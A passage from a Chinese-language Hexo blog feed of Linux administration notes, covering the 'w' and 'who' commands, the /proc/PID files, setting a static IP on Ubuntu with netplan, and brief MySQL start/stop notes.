class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">4.00s</span>  <span class="hljs-number">0.55s</span>  <span class="hljs-number">0.55s</span> -bash<br>root     pts/<span class="hljs-number">1</span>     <span class="hljs-number">23</span>:<span class="hljs-number">47</span>    <span class="hljs-number">8</span>:<span class="hljs-number">52</span>   <span class="hljs-number">0.00s</span>  <span class="hljs-number">0.00s</span> -bash<br></code></pre></td></tr></table></figure><h4 id="s-精简显示"><a href="#s-精简显示" class="headerlink" title="-s 精简显示"></a>-s 精简显示</h4><p>登录用户名，登录方式，登录来源IP，闲置时间，当前操作</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -s</span><br> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">52</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">14</span>:<span class="hljs-number">23</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.04</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM              IDLE WHAT<br>root     tty1                       <span class="hljs-number">1</span>:<span class="hljs-number">04m</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">4.00s</span> -bash<br>root     pts/<span class="hljs-number">1</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>    <span class="hljs-number">9</span>:<span class="hljs-number">16</span>  -bash<br></code></pre></td></tr></table></figure><h4 id="h-不显示标题字段"><a href="#h-不显示标题字段" class="headerlink" title="-h 不显示标题字段"></a>-h 不显示标题字段</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w -h</span><br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">06</span>m  <span class="hljs-number">0.10</span>s  <span class="hljs-number">0.10</span>s <span class="hljs-operator">-</span>bash<br>root     pts<span class="hljs-symbol">/0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">2.00</span>s  <span class="hljs-number">0.55</span>s  <span class="hljs-number">0.55</span>s <span class="hljs-operator">-</span>bash<br>root     pts<span class="hljs-symbol">/1</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">23</span>:<span class="hljs-number">47</span>   <span class="hljs-number">10</span>:<span class="hljs-number">42</span>   <span class="hljs-number">0.00</span>s  <span class="hljs-number">0.00</span>s <span class="hljs-operator">-</span>bash<br></code></pre></td></tr></table></figure><h4 id="i-显示以主机名登录的"><a href="#i-显示以主机名登录的" class="headerlink" title="-i 显示以主机名登录的"></a>-i 显示以主机名登录的</h4><h4 id="V-显示命令版本"><a href="#V-显示命令版本" class="headerlink" title="-V 显示命令版本"></a>-V 显示命令版本</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w -V<br><span class="hljs-attribute">w</span> from procps-ng <span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">17</span><br></code></pre></td></tr></table></figure><h4 id="user-显示指定用户名"><a href="#user-显示指定用户名" class="headerlink" title="user 显示指定用户名"></a>user 显示指定用户名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# w root<br> <span class="hljs-attribute">14</span>:<span class="hljs-number">49</span>:<span class="hljs-number">39</span> up <span class="hljs-number">209</span> days,  <span class="hljs-number">3</span>:<span class="hljs-number">38</span>,  <span class="hljs-number">3</span> users,  load average: <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">03</span>, <span class="hljs-number">0</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>    <span class="hljs-number">4</span>:<span class="hljs-number">08</span>   <span class="hljs-number">0</span>.<span class="hljs-number">02</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s pager<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">06</span>   <span class="hljs-number">27</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">14</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s sh<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>    <span class="hljs-number">218.30.113.53</span>    <span class="hljs-number">14</span>:<span class="hljs-number">19</span>    <span class="hljs-number">3</span>.<span class="hljs-number">00</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">05</span>s  <span class="hljs-number">0</span>.<span class="hljs-number">00</span>s w root<br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><h3 id="登录信息-var-run-utmp"><a href="#登录信息-var-run-utmp" class="headerlink" title="登录信息 &#x2F;var&#x2F;run&#x2F;utmp"></a>登录信息 &#x2F;var&#x2F;run&#x2F;utmp</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">run</span>]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br>-rw-rw-r-- 1 root utmp 4224 8月  25 09:31 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp<br></code></pre></td></tr></table></figure><h3 id="进程信息-proc"><a href="#进程信息-proc" class="headerlink" title="进程信息 &#x2F;proc"></a>进程信息 &#x2F;proc</h3><h1 id="who"><a href="#who" class="headerlink" title="who"></a>who</h1><p>显示当前登录用户</p><h2 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><p>登录用户名</p><p>登录方式：pts 远程登录  tty 本地登录</p><p>登录时间及登录来源IP</p><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><p>who [OPTION]… [ FILE | ARG1 ARG2 ]</p><h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><h4 id="a-–all-显示所有"><a href="#a-–all-显示所有" class="headerlink" title="-a –all 显示所有"></a>-a –all 显示所有</h4><p>等同于  -b -d –login -p -r -t -T -u</p><h4 id="b-–boot-系统最近启动时间"><a href="#b-–boot-系统最近启动时间" class="headerlink" title="-b –boot 系统最近启动时间"></a>-b –boot 系统最近启动时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -b<br>         <span class="hljs-attribute">system</span> boot  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="d-–dead-输出-dead-precess"><a href="#d-–dead-输出-dead-precess" class="headerlink" title="-d –dead 输出 dead precess"></a>-d –dead 输出 dead precess</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@iZbp1191gh7vw52537lyxrZ:/<span class="hljs-comment"># who -d</span><br>         pts<span class="hljs-regexp">/3        2023-08-16 12:14            122616 id=ts/</span><span class="hljs-number">3</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/4        2023-07-11 02:37              5696 id=ts/</span><span class="hljs-number">4</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br>         pts<span class="hljs-regexp">/5        2023-07-11 03:22              5983 id=ts/</span><span class="hljs-number">5</span>  term=<span class="hljs-number">0</span> <span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="H-–heading-输出字段标题"><a href="#H-–heading-输出字段标题" class="headerlink" title="-H –heading 输出字段标题"></a>-H –heading 输出字段标题</h4><h4 id="–ips-输出登录主机hostname对应的ip"><a href="#–ips-输出登录主机hostname对应的ip" class="headerlink" title="–ips 输出登录主机hostname对应的ip"></a>–ips 输出登录主机hostname对应的ip</h4><p>等同于 –lookup </p><p>规范化存储IP，如果可用，就不存储主机名</p><h4 id="l-–login-输出系统登录进程"><a href="#l-–login-输出系统登录进程" class="headerlink" title="-l –login 输出系统登录进程"></a>-l –login 输出系统登录进程</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -l<br><span class="hljs-attribute">LOGIN</span>    ttyS0        <span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">25</span> <span class="hljs-number">10</span>:<span class="hljs-number">21</span>            <span class="hljs-number">306392</span> id=tyS0<br><span class="hljs-attribute">LOGIN</span>    tty1         <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span>               <span class="hljs-number">821</span> id=tty1<br></code></pre></td></tr></table></figure><h4 id="m-只显示-stdin-关联的用户名和主机名"><a href="#m-只显示-stdin-关联的用户名和主机名" class="headerlink" title="-m  只显示 stdin 关联的用户名和主机名"></a>-m  只显示 stdin 关联的用户名和主机名</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -m<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="p-–process-输出初始化衍生的进程"><a href="#p-–process-输出初始化衍生的进程" class="headerlink" title="-p –process 输出初始化衍生的进程"></a>-p –process 输出初始化衍生的进程</h4><h4 id="q-–count-输出当前登录的所有用户名和数量"><a href="#q-–count-输出当前登录的所有用户名和数量" class="headerlink" title="-q –count 输出当前登录的所有用户名和数量"></a>-q –count 输出当前登录的所有用户名和数量</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># who -q</span><br>root root root<br><span class="hljs-comment"># users=3</span><br></code></pre></td></tr></table></figure><h4 id="r-–runlevel-输出当前运行级别"><a href="#r-–runlevel-输出当前运行级别" class="headerlink" title="-r –runlevel 输出当前运行级别"></a>-r –runlevel 输出当前运行级别</h4><p>默认是 5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -r<br>         <span class="hljs-attribute">run</span>-level <span class="hljs-number">5</span>  <span class="hljs-number">2023</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span> <span class="hljs-number">11</span>:<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure><h4 id="s-–short-只输出用户名，登录方式，时间"><a href="#s-–short-只输出用户名，登录方式，时间" class="headerlink" title="-s –short 只输出用户名，登录方式，时间"></a>-s –short 只输出用户名，登录方式，时间</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -s<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="t-–time-显示最后一次系统时钟更改"><a href="#t-–time-显示最后一次系统时钟更改" class="headerlink" title="-t –time 显示最后一次系统时钟更改"></a>-t –time 显示最后一次系统时钟更改</h4><h4 id="T-w-–mesg-增加用户消息状态，可能的值"><a href="#T-w-–mesg-增加用户消息状态，可能的值" class="headerlink" title="-T -w –mesg 增加用户消息状态，可能的值 + - ?"></a>-T -w –mesg 增加用户消息状态，可能的值 + - ?</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -T<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     - pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h4 id="u-–users-用户登录列表"><a href="#u-–users-用户登录列表" class="headerlink" title="-u –users 用户登录列表"></a>-u –users 用户登录列表</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/# who -u<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">0</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">09</span>      <span class="hljs-number">572714</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">1</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">00</span>:<span class="hljs-number">05</span>      <span class="hljs-number">572786</span> (<span class="hljs-number">218.30.113.53</span>)<br><span class="hljs-attribute">root</span>     pts/<span class="hljs-number">2</span>        <span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">04</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>   .        <span class="hljs-number">573045</span> (<span class="hljs-number">218.30.113.53</span>)<br></code></pre></td></tr></table></figure><h2 id="数据来源-1"><a href="#数据来源-1" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>procdir</title>
    <link href="/2024/03/15/yunwei/filesystem/procdir/"/>
    <url>/2024/03/15/yunwei/filesystem/procdir/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux在启动一个进程时，系统会在&#x2F;proc下创建一个以PID命名的文件夹，在该文件夹下会有我们的进程的信息</p><h2 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h2><h3 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe </p><p>可查看到对应进程可执行文件的绝对路径</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">49</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;cmdline </p><p>可查看到对应进程执行的命令（没有空格）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">cat</span> /proc/1211513/cmdline<br>pingwww.baidu.com<br></code></pre></td></tr></table></figure><h3 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;cwd</p><p>查看对应进程启动目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@:~# ls -lat /proc/<span class="hljs-number">659535</span>/cwd<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> /proc/<span class="hljs-number">659535</span>/cwd -&gt; /var/lib/mysql<br></code></pre></td></tr></table></figure><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;environ </p><p>查看进程运行时的环境变量</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root@<span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /proc/659535/environ</span><br><span class="hljs-variable constant_">LANG</span>=en_US.<span class="hljs-variable constant_">UTF</span>-8PATH=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/snap/binNOTIFY_SOCKET=/run/systemd/notifyPIDFILE=/run/mysqld/mysqld</span>.pidHOME=<span class="hljs-regexp">/nonexistentLOGNAME=mysqlUSER=mysqlINVOCATION_ID=4e4bec37552240ebaab8568ce9b7952fJOURNAL_STREAM=8:110456240RUNTIME_DIRECTORY=/run</span><span class="hljs-regexp">/mysqldSYSTEMD_EXEC_PID=659535MYSQLD_PARENT_PID=1</span><br></code></pre></td></tr></table></figure><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;fd </p><p>查看进程打开或使用的文件的符号连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@:~# ls -lat /proc/<span class="hljs-number">659535</span>/fd<br><span class="hljs-attribute">total</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">dr</span>-x------ <span class="hljs-number">2</span> mysql mysql  <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> .<br><span class="hljs-attribute">lr</span>-x------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">0</span> -&gt; /dev/null<br><span class="hljs-attribute">l</span>-wx------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">1</span> -&gt; /var/log/mysql/error.log<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">10</span> -&gt; /var/lib/mysql/ibdata1<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">11</span> -&gt; /var/lib/mysql/#innodb_redo/#ib_redo29<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">12</span> -&gt; /var/lib/mysql/undo_002<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>filesystem</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>filesystem</tag>
      
      <tag>dir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu_static_ip_tips</title>
    <link href="/2024/03/14/network/ip/ubuntu_static_ip_tips/"/>
    <url>/2024/03/14/network/ip/ubuntu_static_ip_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Ubuntu20.4</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>1、备份 &#x2F;etc&#x2F;netplan 下配置文件</p><p>cp &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml.bak</p><p>2、修改 &#x2F;etc&#x2F;netplan 下配置文件</p><p>yaml 文件，需要注意空格缩进</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># Let NetworkManager manage all devices on this system</span><br><span class="hljs-params">network:</span><br>  <span class="hljs-params">version:</span> <span class="hljs-number">2</span><br>  <span class="hljs-params">renderer:</span> NetworkManager<br>  <span class="hljs-params">ethernets:</span><br>    <span class="hljs-params">ens33:</span><br>      <span class="hljs-params">dhcp4:</span> <span class="hljs-literal">false</span><br>      <span class="hljs-params">addresses:</span> <br>          <span class="hljs-operator">-</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">3.223</span><span class="hljs-symbol">/24</span><br>      <span class="hljs-params">routes:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-params">to:</span> default<br>            <span class="hljs-params">via:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">3.1</span><br>ubuntu@ubuntu-virtual-machine:<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p>3、应用当前配置</p><p>sudo netplan apply</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="配置后没有网络"><a href="#配置后没有网络" class="headerlink" title="配置后没有网络"></a>配置后没有网络</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>ip  a  对应网卡没有IP信息</p><p>图形界面也没有网络信息，右上角开关按钮-&gt;Settings-&gt;Network 只有 VPN 和 Network Proxy ，没有 Wired</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>停止网络服务，删除缓存信息，启动网络服务</p><p>service NetworkManager stop</p><p>rm -rf &#x2F;var&#x2F;lib&#x2F;NetworkManager&#x2F;NetworkManager.state</p><p>service NetworkManager start </p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>ip</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>ip</tag>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_op</title>
    <link href="/2024/03/13/db/mysql/mysql_op/"/>
    <url>/2024/03/13/db/mysql/mysql_op/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录日常mysql数据的操作命令</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="启动停止"><a href="#启动停止" class="headerlink" title="启动停止"></a>启动停止</h2><p>net start mysql</p><p>net stop mysql</p>]]></content>
    
    
    <categories>
      
      <category>db</category>
      
      <category>mysql</category>
      
      <category>mysql_op</category>
      
    </categories>
    
    
    <tags>
      
      <tag>db</tag>
      
      <tag>mysql</tag>
      
      <tag>mysql_op</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql_error</title>
    <link href="/2024/03/13/db/mysql/mysql_error/"/>
    <url>/2024/03/13/db/mysql/mysql_error/</url>
    
